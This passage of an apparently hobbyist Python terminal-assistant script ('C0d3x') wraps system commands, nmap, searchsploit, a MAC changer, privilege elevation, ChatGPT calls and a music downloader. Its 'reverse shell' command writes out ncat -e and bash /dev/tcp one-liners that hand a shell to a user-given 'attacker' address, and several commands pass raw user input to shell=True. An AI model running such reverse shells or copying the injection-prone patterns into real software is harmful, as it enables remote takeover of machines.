                    otros = {'chao', 'bueno', 'enga', 'venga', 'a mamarla'}
                    for i in ko:
                        if saludo == i:
                          for i in otros:
                            limpieza()
                            others = random.sample(i, 1)[0]
                            print(random_key_colour + "\n" + others + random_key_face + random_key_colour +"zZz")
                            if platform.system() == 'Linux':
                                print(others)
                            elif platform.system() == 'Windows':
                                speak(others)
                            exit()
                    for i in otros:
                        if saludo == i:
                            limpieza()
                            print(random_key_colour2 + others + random_colours3 + " ｡ ◕ ‿ ◕ ｡" )
                            speak(others)
                            exit()
     
                    #Busqueda en internet  
                    def buscar(busqueda):
                        webbrowser.open("https://www.google.com/search?client=opera-gx&q=" + busqueda + "&sourceid=opera&ie=UTF-8&oe=UTF-8")
              
                    explorador = {'internet', 'busca', '@'}
                    for i in explorador:
                        if saludo == i:
                            limpieza()
                            busca = buscar(input(Fore.BLUE + "@Busqueda@-->" + Fore.LIGHTGREEN_EX))
                            limpieza()
                    #openai integration
                    if 'codex' in saludo:  
                        import openai      
                        try:
                          saludo = saludo.replace('codex','')
                          #openai api
                          client = OpenAI(api_key='')
                          completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(saludo)}])
                          response = completion.choices[0].message.content  
                          print(response)
                        except openai.AuthenticationError:
                            print(random_key_colour + 'Algo ha ocurrido con la API(openai), compruebalo.\n')
                            continue
                        except openai.RateLimitError:
                            print(random_key_colour + 'Algo ha ocurrido con el tiempo de respuesta de la API(openai).\n')
                            continue
                        except openai.InternalServerError:
                            print(Fore.LIGHTRED_EX + 'Sobrecarga de peticiones, intentelo en unos momentos(openai).')
                    





#English Text
def BucleEnglish():
    #Elección del color de texto preferido
    
    if platform.system() == 'Windows':
                    speak("Hello, im Codex")
    print(                Fore.GREEN+'\n░█████╗░░█████╗░██████╗░██████╗░██╗░░██\n'+ 
                          Fore.CYAN + '██╔══██╗██╔══██╗██╔══██╗╚════██╗╚██╗██╔╝\n'+
                          Fore.GREEN +'██║░░╚═╝██║░░██║██║░░██║░█████╔╝░╚███╔╝░\n'+
                          Fore.CYAN + '██║░░██╗██║░░██║██║░░██║░╚═══██╗░██╔██╗░\n'+
                          Fore.GREEN +'╚█████╔╝╚█████╔╝██████╔╝██████╔╝██╔╝╚██╗\n'+
                          Fore.GREEN +'░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚═╝░░╚═╝\n')
    while True:
                    #console
                    # Cargar el color preferido al inicio del programa
                    color_preferido_guardado = cargar_color_preferido()
                    if color_preferido_guardado:
                        color_escojido = color_preferido_guardado
                    else:
                        colours()
                    random_colours = (Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX)
                    random_colours2 = (Fore.LIGHTBLUE_EX, Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTWHITE_EX)
                    random_colours3 = (Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX)
                    random_key_colour = random.sample(random_colours, 1)[0]
                    random_key_colour2 = random.sample(random_colours2, 1)[0]
                    random_key_colour3 = random.sample(random_colours3, 1)[0]
                    random_face = ("｡ ◕ ‿ ◕ ｡", "｡ - ‿ - ｡")
                    random_key_face =  random.sample(random_face, 1)[0]
                    dt = datetime.datetime.now()
                    if platform.system() == 'Windows':
                        pwd1 = subprocess.Popen('cd', stdout=subprocess.PIPE, shell=True)
                        (out, err) = pwd1.communicate()
                        out1 = str(out[3:-2]).replace("'",'')
                        out2 = str(out1[1:]).replace('\\', "/")
                        out3 = str(out2).replace('//', '/')
                    else:
                        pwd1 = subprocess.Popen('cd', stdout=subprocess.PIPE, shell=True)
                        (out, err) = pwd1.communicate()
                        out1 = str(out[3:-2]).replace("'",'')
                        out2 = str(out1[1:]).replace('\\', "/")
                        out3 = str(out2).replace('//', '/')
                        pathC = subprocess.Popen("pwd", stdout=subprocess.PIPE, shell=True)
                        (out, err) = pathC.communicate()
                        pathCout = str(out).replace("b'", '')
                        pathCout1 = str(pathCout).replace("n'", '')
                        pathCout2 = str(pathCout1[:-1])
                    if '' == str(out3):
                        pathcurrent=random_key_colour + "\n\n     {}:{} \n".format(dt.hour, dt.minute) + random_key_colour + '⦿ '  + random_key_colour2 + "C0d3x " + random_key_colour3 + random_key_face + random_key_colour + ' ⦿ ' + random_key_colour3 + str(pathCout2) + random_key_colour + ' ⦿ '
                    else:
                        pathcurrent=random_key_colour + "\n     {}:{} \n".format(dt.hour, dt.minute) + random_key_colour + '⦿ '  + random_key_colour2 + "C0d3x " + random_key_colour3 + random_key_face + random_key_colour + ' ⦿ ' + random_key_colour3 + str(out3) + random_key_colour + ' ⦿ '

                    saludo = (input(pathcurrent + random_key_colour3 + '\n> ' + color_escojido))  
                     # Definition of commands and descriptions
                    help_dict = {
                        'os': '- Displays the operating system of the current machine',
                        'nmap': '- Network scanning tool',
                        'ping': '- Scanning tool through ICMP packet sending (Example:"-c 1 127.0.0.1")',
                        'pwd': '- Displays the current directory path you are working in',
                        'ls/dir': '- Displays the content of the current directory',
                        'ifconfig/ipconfig': '- Displays assigned network interfaces',
                        'ip': '- Displays the local address of the equipment',
                        'console or shell': '- Displays a selection of different types of shells (powershell, cmd, bash, zsh...)',
                        'clear': '- Clears the screen',
                        'internet/search/@': '- Searches and opens with your computer\'s default browser',
                        'voice': '- Activates "Voice Only" mode of C0d3x',
                        'searchsploit': '- Command-line search tool for Exploit-DB that allows you to get a copy of the Exploit-DB database (Needs to be installed on the system to work)',
                        'update': '- For Linux updatedd system',
                        'upgrade': '- For Linux upgrade system',
                        'email': '- Use the email service to send and check emails.',
                        'rm -rf or rmdir /s': '- Delete directories and all their contents.',
                        'mp3': '- Download and play MP3 music.',
                        'copy all': '- Copy all the content from the current folder and move it to the gold folder.',
                        'zsh/powershell/bash/cmd': '- Open a shell.',
                        'macchanger': '- Change the MAC address of some interface.',
                        'elevate': '- Elevate privileges to administrator.',
                        'crypto': '- Check the current price of certain cryptocurrencies. (Requires API, you can add it from the code if required)',
                        'gpt': '- Talk to an openai AI. (Requires API, you can add it from the code if required)',
                        'dns': '- Clear the DNS cache.',
                        'interfaces': '- Display available network interfaces.',
                        'run': '- Run a script in python.',
                        'cd': '- Move between directories.',
                        'mkdir': '- Create a directory by writing its name followed by the command.',
                        'screenshot/capture': '- Take a capture that will be saved in the same directory in .png format',
                        'open': '- Run specified files, whether they are binaries, music files, images ...',
                        'cat': '- Show the plain text content of files.',
                        'rm/del': '- Delete files.',
                        'reverse shell': '- Connect to the current device from a remote device using reverse shell. (You must be listening from the remote device)',
                        'check dns': '- Show the DNS address configured in the main interface.',
                        'change dns': '- Change the DNS configuration by changing its address.',
                        'videoconvert': '- Convert video files to audio format.',
                        'shutdown': '- Shut down the system, use the -t option to specify the time before shutdown, -r to specify a reboot, and combine both as you wish.',
                        'ps': '- Show the processes currently working in the system, use the -p parameter to specify the pid of a specific process and be able to consult its information.',
                        'connections': '- Show the active connections',
                        'console': '- Access a console on the current system.',
                        'host4live': '- Show the devices connected to the specified network.',
                        'close': '- Close a currently running process.',
                        'process': '- Show the running processes of the current user.',
                        'process root': '- Show the currently running processes of all active users.',
                        'colors': '- Change the color theme of your text.',
                        'whois': '- Check the information of the selected IP',
                        'public ip': '- Show the public IP of the current network.',
                        'teacher': '- Learn something with an AI teacher about different things.'
                        }

                    # Creación del mensaje de ayuda
                    help_message = ""
                    for command, description in help_dict.items():
                        command_string = f"{Fore.LIGHTYELLOW_EX} > {Fore.LIGHTGREEN_EX}{command.ljust(25, ' ')} {description}\n"
                        help_message += command_string
                        
                    help_call = {'help', '-help', '--help', '-h', 'ayuda'}
                    for i in help_call:
                        helpcommand = i
                        if saludo == helpcommand:
                            # Impresión del mensaje de ayuda
                            print(Fore.GREEN+'\n\n░█████╗░░█████╗░███╗░░░███╗███╗░░░███╗░█████╗░███╗░░██╗██████╗░░██████╗\n'+ 
                                    Fore.CYAN +  '██╔══██╗██╔══██╗████╗░████║████╗░████║██╔══██╗████╗░██║██╔══██╗██╔════╝\n'+
                                    Fore.GREEN+  '██║░░╚═╝██║░░██║██╔████╔██║██╔████╔██║███████║██╔██╗██║██║░░██║╚█████╗░\n'+
                                    Fore.CYAN +  '██║░░██╗██║░░██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚████║██║░░██║░╚═══██╗\n'+
                                    Fore.GREEN+  '╚█████╔╝╚█████╔╝██║░╚═╝░██║██║░╚═╝░██║██║░░██║██║░╚███║██████╔╝██████╔╝\n'+
                                    Fore.CYAN +  '░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░\n')
                            print(help_message)

                    # Función para imprimir ayuda específica
                    def print_specific_help(command):
                        if command in help_dict:
                            print(f"{Fore.LIGHTYELLOW_EX} > {Fore.LIGHTGREEN_EX}{command.ljust(25, ' ')} {help_dict[command]}\n")
                        else:
                            print(f"No se ha encontrado ayuda para el comando {command}.\n")
                    
                    # Verificar si se proporciona un argumento de ayuda
                    for command in help_dict:
                        if command in saludo and helpcommand in saludo:
                            print_specific_help(command) 
                    
                    #cleaner screen with the key "Enter"
                    if saludo == "":
                        limpieza()
                    if saludo != "":
                        print('\n')
                    
                    #comunication
                    saludos = ('Hello', 'hello', 'Hi', 'hi', 'Hey', 'hey')
                    for i in saludos:
                        if saludo == i:
                            limpieza()
                            saludos = ('Good morning', 'How are you today?','Nice to meet you', 'Hi!', 'Hey whats up?')
                            random_key = random.sample(saludos, 1)[0]
                            print("\n"+Style.NORMAL + Fore.YELLOW + random_key + " ｡◕ ‿ ◕ ｡\n")
                            if platform.system() == 'Linux':
                                print(str(random_key))
                            elif platform.system() == 'Windows':
                                speak(random_key)
                            
        
                    questions = {'who are you', 'who are you?', 'what are you', 'what are you?'}
                    for i in questions:
                        if saludo == i:
                            limpieza()
                            
                            if platform.system() == 'Linux':
                                print('Im a python programme, my purpose is to be a laboratory for learn this programme language but maybe in a future this purpose can will be change\n')
                            elif platform.system() == 'Windows':
                                speak('Im a python programme, my purpose is to be a laboratory for learn this programme language but maybe in a future this purpose can will be change')
                            

                    #python script launcher
                    if 'run ' in saludo:
                        saludo = '/' + saludo[4:] 
                        try:
                            pwd1 = subprocess.Popen('cd', stdout=subprocess.PIPE, shell=True)
                            (out, err) = pwd1.communicate()
                            out1 = str(out[3:-2]).replace("'",'')
                            out2 = str(out1[1:]).replace('\\', "/")
                            out3 = str(out2).replace('//', '/')
                            print('start wt.exe python C:/' + out3 + saludo)
                            subprocess.run("start wt.exe python C:/" + out3 + saludo, shell=True)
                        except:
                            print(Fore.LIGHTRED_EX + 'This file is not on the actual directory.\n')

                    spanishs = ('Spanish', 'spanish', 'español', 'Español', 'Modo español', 'modo español', 'spanish mode')
                    if saludo in spanishs:
                        limpieza()
                        BucleEspanol()

                    #os details
                    if saludo == 'os':
                        if platform.system() == "Linux":
                            print(Fore.LIGHTGREEN_EX + "UNIX OS\n")
                            print('Version ' + str(platform.release()))
                        elif platform.system() == "Windows":
                            print(Fore.LIGHTBLUE_EX + "MICROSOFT OS\n")
                            speak('A fucking Windows my brother')
                            print('Windows ' + str(platform.release()))
                        elif platform.system() == "Mac":
                            print(Fore.LIGHTYELLOW_EX + "APPLE OS\n")
                            speak('Apple os')
                        elif os.path.exists('/data/data/com.termux/'):
                             print('TERMUX')   
                             print('Android ' + str(platform.release()))
                        else:
                            print(Fore.LIGHTRED_EX + "No info about os")
                
                    #Voice
                    if saludo == 'voice':
                        if platform.system() == 'Windows':
                            signal.signal(signal.SIGINT, def_handler)
                        if platform.system() == 'Linux':
                            print("Voice not available on linux yet")
                            sys.exit(1)
                        elif platform.system() == 'Windows':
                            speak('Im hearing you')
                                
                        
                        def bucle_voice():
                            while True:
                                try:
                                    speak('Voice function its not available')
                                    BucleEnglish()
                                    #VoiceEnglish()
                                
                                except UnboundLocalError:
                                    limpieza()
                                    continue
                        while True:
                            bucle_voice()            

                    if UnboundLocalError == True:
                        continue
        

                    #cleanMEMdns
                    if saludo == 'dns':
                        if platform.system() == 'Windows':
                            os.system('ipconfig /flushdns')
                        elif platform.system() == 'Linux':
                            subprocess.call(['sudo', 'systemctl', 'restart', 'network-manager'])
                        elif distro_name == 'Ubuntu':
                            subprocess.call(['sudo', 'service', 'network-manager', 'restart'])
                    #Nmap  
                    if 'nmap' in saludo[0:5]:
                        try:
                            print(Fore.LIGHTGREEN_EX + 'Examples >' + Fore.LIGHTWHITE_EX + '[IP = 127.0.0.1 ] - [OPTIONS = -Pn -n -sSC -oN Scans]')
                            saludo = saludo.replace('nmap ','')
                            subprocess.call(["nmap", saludo]) 
                            print("\n")

                        except KeyboardInterrupt:
                            BucleEnglish()
                    
                    #teacher
                    if saludo == 'teacher':
                        teacher()

                    #readspeaker
                    if saludo == 'speaker':
                        print(Fore.LIGHTCYAN_EX + '+' + 'Introduce some data and im gonna sing it: ')

                        if platform.system() == 'Windows':
                            subprocess.run('notepad.exe input.txt', shell=True)
                        elif platform.system() == 'Linux':
                            subprocess.run('nano input.txt', shell=True)
                        while True:
                            try:
                                with open('input.txt','r') as file:
                                    info = file.read()
                                    hablar(info)
                                    break
                            except FileNotFoundError:
                                print('File not found.')
                                continue
                            except TypeError:
                                continue	

                             
                    #elevate
                    if saludo == 'elevate' or saludo == 'root':
                        if platform.system()=='Windows':
                            elevate.elevate()
                        elif platform.system()=='Linux':
                            try:
                                subprocess.run('sudo cp -r ~/C0d3x /root 2>/dev/null & sudo su', shell=True)
                            except:
                                continue
                    #Interfaces information
                    if 'interfaces' in saludo:
                        if platform.system() == 'Windows':
                            subprocess.run('powershell -Command "Get-NetAdapter"', shell=True)

                        elif platform.system() == 'Linux':
                            subprocess.run('ip addr', shell=True)
                    #ps
                    if saludo == 'ps':
                        if platform.system() == 'Windows':
                            subprocess.run('tasklist')
                            
                        else:
                            subprocess.run('ps', shell=True)
                    #ps 1 task
                    if saludo[0:5] == 'ps -p':
                        process1=str(saludo[6:])
                        if platform.system() == 'Windows':
                            subprocess.run('tasklist /fi "PID eq ' + process1 + '"')
                            
                        else:
                            subprocess.run('ps -p ' + process1, shell=True)
                    
                    
                    #Videoconvert
                    if saludo == 'videoconvert':
                        try:
                            def convertir_video_a_audio(video_path, audio_path):
                                video = VideoFileClip(video_path)
                                audio = video.audio
                                audio.write_audiofile(audio_path)

                            # Ruta del archivo de video de entrada y salida de audio
                            archivo_video = input('Introduce el archivo de video>')
                            videoformats = ['.mp4', '.mkv', '.mov', '.flv']
                            for i in videoformats:
                                if i in str(archivo_video):
                                    archivo_video1 = archivo_video.replace(i, '')
                                    archivo_audio = str(archivo_video1) + "Audio.mp3"
                            # Llamada a la función para convertir el video a audio
                            convertir_video_a_audio(archivo_video, archivo_audio)
                        except:
                            print(random_key_colour + 'Something wrong happened with the Video Convert')

                    #macchanger
                    if 'macchanger' in saludo:

                        lista = ('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0','1','2','1','2','3','4','5','6','7','8','9','0','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0')
                        lista2 = ('0E','0A','06', '02')
                        randomlist1 = random.sample(lista,1)[0]
                        randomlist2 = random.sample(lista,1)[0]
                        randomlist3 = random.sample(lista,1)[0]
                        randomlist4 = random.sample(lista,1)[0]
                        randomlist5 = random.sample(lista2,1)[0]

                        mac1 = str(randomlist1)
                        mac2 = str(randomlist2)
                        mac3 = str(randomlist3)
                        mac4 = str(randomlist4)
                        mac5 = str(randomlist5)
                        randommaclinux = mac5 + ':' + mac3 + mac4 + ':' + mac3 + mac2 + ':' + mac4 + mac1 + ':' + mac1 + mac3 + ':' + mac2 + mac4
                        randommacwindows = mac5 + '-22-33-44-55-66'
                        
                        print(Fore.LIGHTRED_EX + '[º]' + Fore.LIGHTGREEN_EX + 'Select interfaces:\n')
                        if platform.system() == "linux":
                            subprocess.run('ifconfig', shell=True)
                        elif platform.system() == "Windows":
                            subprocess.run('powershell -Command "Get-NetAdapter"', shell=True)
                        interface=input('\nInterfaz>')

                        if platform.system() == "linux":
                            subprocess.call(["ifconfig", interface, "down"])
                            subprocess.run("ifconfig " + interface + " hw ether " + str(randommaclinux), shell=True)
                            subprocess.call(["ifconfig", interface, "up"])
                            print(Fore.LIGHTYELLOW_EX + '\n[+]' + Fore.LIGHTGREEN_EX + "Mac address changed to: " + Fore.LIGHTRED_EX + str(randommaclinux) + '\n')

                        elif platform.system() == 'Windows':
                            randommacW = randommacwindows
                            randommacwindows = "'" + randommacwindows + "'"
                            interfacewindows = "'" + interface + "'"
                            Macchange = '| Set-NetAdapter -MacAddress ' + randommacwindows + '"'
                            subprocess.call('powershell -Command "Get-NetAdapter ' + interfacewindows + ' ' + Macchange)
                            checkmac = 'powershell -Command "Get-NetAdapter ' + interfacewindows + '"'
                            out = subprocess.Popen(str(checkmac), stdout=subprocess.PIPE, shell=True)
                            (out, err) = out.communicate()
                            if str(randommacW) in str(out):
                                print(Fore.LIGHTYELLOW_EX + '\n[+]' + Fore.LIGHTGREEN_EX + "Mac address changed to: " + Fore.LIGHTRED_EX + str(randommacW) + '\n')
                            else:
                                print(Fore.LIGHTRED_EX + '\n[-]' + Fore.LIGHTGREEN_EX + 'Some error ocurred.'+ '\n')
                    #crypto
                    if saludo == 'crypto':
                        async def get_price(symbol):
                            url = f"https://pro-api.coinmarketcap.com/v1/cryptocurrency/quotes/latest?symbol={symbol}&convert=USD" 
                            headers = {
                                "Accepts": "application/json",
                                "X-CMC_Pro_API_Key": ""
                            }
                            response = requests.get(url, headers=headers).json()
                            return response["data"][symbol]["quote"]["USD"]["price"]
                        async def main():
                            symbols = ["BTC", "ETH", "XRP", "LTC", "BCH", "DOGE", "SOL"]
                            tasks = [asyncio.ensure_future(get_price(symbol)) for symbol in symbols]
                            prices = await asyncio.gather(*tasks)

                            for symbol, price in zip(symbols, prices):
                                print(Fore.LIGHTYELLOW_EX + '\n[' + Fore.LIGHTGREEN_EX + '+' + Fore.LIGHTYELLOW_EX + ']' + Fore.LIGHTMAGENTA_EX + "The current price of " + Fore.LIGHTGREEN_EX + str(symbol) + Fore.LIGHTMAGENTA_EX + " is " + Fore.LIGHTGREEN_EX + str("{:.4f}".format(price)) + '$\n')
                        asyncio.run(main())
                    #chatGPT
                    if saludo == 'gpt':
                        while True:
                          try:
                            import openai
                            client = OpenAI(api_key='')
                            prompt = input(random_key_colour2 + '⦿ ' + random_key_colour + 'ChatGPT' + random_key_colour2 + ' ⦿ ' + random_key_colour + '¿What can i do for you? (Go back = exit)\n>' + Fore.LIGHTGREEN_EX)
                            completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(prompt)}])
                            print(completion.choices[0].message.content)
                            print("\n")
                            if prompt == 'exit':
                                break
                            elif prompt == 'clean' or prompt == 'clear':
                                limpieza()
                                continue
                            elif prompt == '' or prompt == ' ':
                                limpieza()
                                continue
                                        
                          except openai.AuthenticationError:
                            print(random_key_colour + 'Something happens with the API, check it.\n')
                            continue
                          except openai.RateLimitError:
                            print(random_key_colour + 'Something went wrong, check the API or try again.\n')
                            continue

                    #Searchsploit
                    if 'searchsploit' in saludo:
                        if platform.system() == 'Linux':
                            saludo = saludo.replace("searchsploit ", "")
                            os.system('searchsploit ' + saludo)

                        elif platform.system() == 'Windows':
                            saludo = saludo.replace("searchsploit ", "")
                            os.system('searchsploit ' + saludo)
                            if os.system('searchsploit ' + saludo) == 1:
                                limpieza()
                                print('There was an error, check searchsploit is installed')

                        else:
                            print("\n")
                    #Show the actives conections
                    if  saludo == 'conex':
                        if platform.system() == 'Windows':
                            subprocess.run('netstat -ano', shell=True)
                        else:
                            subprocess.run('ss -tuln', shell=True)
                   #check DNS status
                    if saludo == 'check dns':
                        def get_dns_servers():
                            dns_servers = []
                            # Obtener el código de página predeterminado del sistema
                            encoding = sys.getdefaultencoding()
                            # Ejecutar el comando ipconfig en la terminal de Windows
                            output = subprocess.check_output(['ipconfig', '/all'], shell=True).decode(encoding, errors='ignore')
                            # Buscar las líneas que contienen las direcciones DNS
                            lines = output.split('\n')
                            for i in range(len(lines)):
                                if 'Servidores DNS' in lines[i]:
                                    parts = lines[i].split(':')
                                    if len(parts) >= 2:
                                        dns_servers.extend(parts[1].strip().split(', '))
                            return dns_servers
                        # Obtener la lista de servidores DNS
                        encoding = sys.getdefaultencoding()
                        output = subprocess.check_output(['ipconfig', '/all'], shell=True).decode(encoding, errors='ignore')
                        # Buscar las líneas que contienen las direcciones DNS
                        lines = output.split('\n')
                        for i in range(len(lines)):
                            if 'Servidores DNS' in lines[i]:
                                parts = lines[i].split(':')
                                dns2=lines[i+1].strip()  # Línea siguiente
                        dns_servers = get_dns_servers()
                        # Imprimir los servidores DNS
                        if dns_servers:
                            print("Servidores DNS:")
                            for server in dns_servers:
                                print(server + ' - ' + dns2)
                        else:
                            print("Not found dns configured.")


                    #change dns
                    if saludo[0:10] == 'change dns':
                        import wmi
                        def get_network_interfaces():
                            c = wmi.WMI()
                            interfaces = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
                            return [interface.Description for interface in interfaces]
                        # Get the list of network interfaces
                        network_interfaces = get_network_interfaces()
                        # Print the available network interfaces
                        for interface in network_interfaces:
                            interface=interface
                        def change_dns_address(interface_name, dns_servers):
                            # Connect to WMI
                            c = wmi.WMI()
                            # Find the network interface
                            interfaces = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
                            target_interface = None
                            for interface in interfaces:
                                if interface.Description == interface_name:
                                    target_interface = interface
                                    break
                            if target_interface is None:
                                print(f"Network interface '{interface_name}' not found.")
                                return
                            # Set the DNS servers
                            dns = target_interface.DNSServerSearchOrder
                            dns_servers = list(dns_servers)  # Convert to list if not already
                            return_value = target_interface.SetDNSServerSearchOrder(DNSServerSearchOrder=dns_servers)
                            if return_value[0] == 0:
                                print(f"DNS servers changed successfully: {dns_servers}")
                            else:
                                print("Failed to change DNS servers. Maybe try as administrator.")
                        # Specify the interface name and the new DNS server
                        interface_name = str(interface)  # Replace with your interface nam
                        dns_servers = [saludo[11:18], saludo[19:26]]  # Replace with your desired DNS servers
                        # Change the DNS servers
                        change_dns_address(interface_name, dns_servers)

                    # Obtener la IP pública
                    if saludo == 'public ip':
                        ip_publica = obtener_ip_publica()
                        print(Fore.LIGHTGREEN_EX + "Your public ip is: " + Fore.LIGHTYELLOW_EX + ip_publica)

                    #reverseshell
                    if saludo == 'reverse shell':
                        def reverse():
                            import socket
                            ip_attacker=input(Fore.LIGHTRED_EX + 'Introduce the attacker ip address' + Fore.LIGHTBLUE_EX + '(From where you want to conect)' + Fore.LIGHTRED_EX + ': ' + Fore.LIGHTGREEN_EX)
                            port_attacker=input(Fore.LIGHTRED_EX + 'Introduce attacker port: ' + Fore.LIGHTGREEN_EX)
                            port_attacker1=int(port_attacker)
                            if platform.system() == 'Windows':
                                limpieza()
                                subprocess.run('ncat ' + str(ip_attacker) + ' ' + str(port_attacker) + ' -e cmd.exe', shell=True)
                            elif platform.system() == 'Linux':
                                limpieza()
                                if os.path.exists('/data/data/com.termux/'):
                                    subprocess.run('apt install nmap-ncat && apt autoremove && ncat ' + str(ip_attacker) + ' ' + str(port_attacker) + ' -e /data/data/com.termux/files/usr/bin/bash', shell=True)
                                else:
                                    subprocess.run('bash -i >& /dev/tcp/' + str(ip_attacker) + '/' + str(port_attacker) + ' 0>&1', shell=True)
                        try:
                            reverse()
                        except ValueError:
                            continue

                    #whois
                    if saludo[0:int(len('whois'))] == 'whois':
                        import whois
                        def whosis():
                            def ip_whois(ip_address):
                                try:
                                    result = whois.whois(ip_address)
                                    print(result)
                                except Exception as e:
                                    print("Error in request to WHOIS:", str(e))
                            # Ejemplo de uso
                            ip = input(Fore.LIGHTBLUE_EX + 'Introduce la ip\n' + Fore.LIGHTGREEN_EX + '>' + Fore.LIGHTYELLOW_EX)  # Ingresa la dirección IP que deseas consultar
                            ip_whois(ip)
                        whosis()

                    #Whoami
                    if saludo == 'whoami':
                        subprocess.run(['whoami'])

                   #show files content
                    if 'cat' in saludo or 'type' in saludo:

                        if platform.system() == 'Windows':

                            if 'cat' in saludo:
                                saludo = saludo.replace('cat ','')
                            elif 'type' in saludo:
                                saludo = saludo.replace('type ','')
                            #formatos    
                            if '.py' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'python')
                            elif '.bat' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'batch')
                            elif '.sh' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'bash')
                            elif '.js' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'javascript')
                            elif '.html' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'html')
                            elif '.css' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'css')
                            elif '.php' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'php')
                            elif '.xml' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'xml')
                            elif '.txt' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'text')
                            elif '.rb' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'ruby')
                            elif '.java' in str(saludo):
                                mostrar_codigo_en_colores(str(saludo), 'java')
                            else:
                                os.system('\ntype ' + str(saludo) + '\n')

                        elif platform.system() == 'Linux':
                            print(random_key_colour + '[!] ' + random_key_colour2 + 'Instalando Bat!')
                            os.system('sudo apt install bat')
                            os.system('mkdir -p ~/.local/bin && ln -s /usr/bin/batcat ~/.local/bin/bat')
                            saludo = saludo.replace('bat ','')
                            os.system('bat ' + str(saludo) + "\n")

                    #show proccess
                    if saludo == 'proccess' or saludo  == 'procesos':
                        if windows:
                            subprocess.run('tasklist', shell=True)
                        elif linux:
                            subprocess.run('ps', shell=True)
                    
                    if saludo == 'proccess root' or saludo == 'procesos root':
                        if windows:
                            subprocess.run("tasklist /v /fi 'USERNAME ne NT AUTHORITY\SYSTEM'", shell=True)
                        elif linux:
                            subprocess.run('ps -a', shell=True)


                    #close proccess
                    if saludo[0:5] == 'close':
                        close_proc(saludo[6:])

                   #Mp3
                    if saludo == 'mp3':

                        filesmp4 = fnmatch.filter(os.listdir(os.getcwd()), "*.mp4")
                        filesmp3 = fnmatch.filter(os.listdir(os.getcwd()), "*.mp3")
                        allfiles = filesmp3 + filesmp4
                        print(random_key_colour + "     {}:{} \n".format(dt.hour, dt.minute) + random_key_colour2 + "MP3 " + random_key_colour3 + str(random_key_face))
                        selectionmusic = input(Fore.LIGHTGREEN_EX + '\nPlay or download music?' + Fore.LIGHTBLUE_EX + '(1 or 2)\n' + Fore.LIGHTMAGENTA_EX + '>')
                        if selectionmusic == '1':
                            
                            try:
                               
                                
                                mp3 = str(filesmp3).replace("[]","").replace(']',"").replace('[',"").replace(", ","\n").replace("'","")
                                mp4 = str(filesmp4).replace("[]","").replace(']',"").replace('[',"").replace(", ","\n").replace("'","")
                                mps = mp3 + mp4

                                def play():
                                    music = input('Which song you want to play? >')
                                    matched_files = fnmatch.filter(os.listdir(os.getcwd()), f'*{music}*{i}')
                                    if music == '':
                                        if platform.system() == 'Windows':
                                            print(random.sample(allfiles, 1)[0])
                                            webbrowser.open(random.sample(allfiles, 1)[0])
                                        elif platform.system() == 'Linux':
                                            print(random.sample(allfiles, 1)[0])
                                            os.system('pip install mpv > /dev/null 2>&1')
                                            os.system('mpv "' + random.sample(mp4, 1)[0] + '" > /dev/null 2>&1 &')
                                    elif matched_files:
                                        matched_file = matched_files[0]
                                        if platform.system() == 'Windows':
                                            webbrowser.open(matched_file)
                                            print(random_key_colour + 'For pause > pause\nFor play > play' + random_key_face)
                                        

                                        elif platform.system() == 'Linux':
                                            os.system('pip install mpv > /dev/null 2>&1')
                                            os.system('mpv "' + matched_file + '" > /dev/null 2>&1 &')
                                        
                                formats = ('.mp3','.mp4')
                                for i in formats:
                                    if i in mps:
                                        play()
                                    
                                    
                                if mps == '':
                                    limpieza()
                                    print(Fore.LIGHTRED_EX + '[!] There is not files mp3 o mp4 at the actual directory, change directory or ddownload song with option 2.\n')

                                
                                              
                            except:
                                continue

                        elif selectionmusic == '2':
                            try:
                                url = input(random_key_colour + 'Introduce the music you want to download (url youtube)\n>')
                                yt = YouTube(str(url)) 
                                download_Video(yt)
                                titulo_coma = yt.title.replace("'","")
                                titulo_barra = titulo_coma.replace("/","")
                                titulo = titulo_barra.replace("|","")
                                audiomp3 = titulo + '.mp4'
                                print(str(audiomp3) + ' download success')
                            except RemoteDisconnected:
                               print(Fore.LIGHTRED_EX + '[!]' + Fore.LIGHTGREEN_EX + ' Something wrong trying to connect with the remote server')
                               BucleEspanol()
                            except KeyError:
                                print(Fore.LIGHTRED_EX + '[!]' + Fore.LIGHTGREEN_EX + ' Wrong url')
                                BucleEspanol()
                            except:
                                print(Fore.LIGHTRED_EX + '[!]' + Fore.LIGHTGREEN_EX + ' Something wrong happened, try later.')
                                BucleEspanol()
                    pauseplay = ('pause', 'play')
                    if saludo in pauseplay:
                            if 'termux' in os.getcwd():
                                subprocess.run('pkill mpv', shell=True)
                                continue
                            elif os.getcwd() != 'termux':
                                keyboard_.press(KeyCode.from_vk(0xB3))  # Play/Pause
                    
                    #cd
                    elif 'cd ' in saludo:
                        try:
                            os.chdir(saludo[3:])
                        except OSError:
                            continue

